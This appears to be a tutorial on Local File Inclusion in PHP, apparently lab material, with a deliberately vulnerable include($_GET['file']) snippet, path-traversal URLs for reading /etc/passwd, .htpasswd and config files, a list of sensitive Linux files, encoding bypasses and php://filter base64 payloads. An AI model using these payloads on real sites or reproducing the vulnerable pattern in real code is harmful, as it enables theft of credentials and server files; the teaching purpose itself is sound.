### How does an LFI Attack Work

A Local File Inclusion can occur when an application includes a file as user input without properly validating it. This flaw enables an attacker to include malicious files by manipulating the input.

The following vulnerable PHP code could lead to LFI:

```bash
https://website-example.com/?page=filename.php
https://website-example.com/?page=../../../../etc/test.txt
https://example-vulnerable-website.com/?helpfile=../secret/.htpasswd
https://example-vulnerable-website.com/?module=/etc/passwd
https://example-vulnerable-website.com/?module=contact.php
http://www.example_target_website.com/download.php?file=../../../../etc/passwd
http://www.example_target_website.com/download.php?file=document.html
https://example-vulnerable-website.com/?helpfile=login.txt
https://example-vulnerable-website.com/?module=uploads/image123.gif
https://example-vulnerable-website.com/?download=brochure.pdf
https://example-vulnerable-website.com/?download=../include/connection.php
```
#### An LFI vulnerability is found in various web applications. As an example, in the PHP, the following functions cause this kind of vulnerability:

```bash
include
require
include_once 
require_once 
```
#### The following is an example of PHP code that is vulnerable to LFI. 
```bash
<?PHP 
    include($_GET["file"]);
?>
```
The PHP code above uses a `GET` request via the URL parameter `file` to include the file on the page. The request can be made by sending the following HTTP request: `http://example.thm.labs/index.php?file=hello.txt` to load the content of the `hello.txt` file that exists in the same directory.

The following are some Linux system files that have sensitive information.
```bash
/etc/issue
/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/etc/motd
/etc/mysql/my.cnf
/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
/proc/self/environ
/proc/version
/proc/cmdline
```
```
http://website.com/index.php?err=../../../../../../../../etc/passwd HTTP/1.1
```
```
http://example.thm.labs/page.php?file=/etc/passwd
http://example.thm.labs/page.php?file=../../../../../../etc/passwd
http://example.thm.labs/page.php?file=../../../../../../etc/passwd%00
http://example.thm.labs/page.php?file=....//....//....//....//etc/passwd
http://example.thm.labs/page.php?file=%252e%252e%252fetc%252fpasswd
```

#### PHP Filter

```
lfi=php://filter/resource=/etc/passwd

lfi=php://filter/convert.base64-encode/resource=/etc/passwd
```
#### Base64 Decoding
```
echo "base64_code" | base64 -d
```
